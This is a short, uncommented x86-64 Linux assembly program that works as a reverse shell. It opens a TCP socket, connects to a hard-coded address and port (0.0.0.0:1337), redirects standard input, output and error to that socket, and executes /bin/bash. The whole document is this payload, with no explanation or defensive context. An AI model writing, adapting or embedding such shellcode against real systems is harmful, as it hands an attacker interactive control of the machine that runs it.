section .data
my_sockaddr_in:
	dw 2
	dw 0x3905
	dd 0x00000000

path db "/bin/bash",0
argv dq path, 0
envp dq 0
section .text
	global _start
_start:
	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall
	mov rdi, rax
	mov rax, 42
	lea rsi, [rel my_sockaddr_in]
	mov rdx, 16
	syscall
	xor rsi, rsi
	dup_loop:
		mov rax, 33
		syscall
		inc rsi
		cmp rsi, 3
		jne dup_loop
	mov rax, 59
	mov rdi, path
	mov rsi, argv
	mov rdx, envp
	syscall
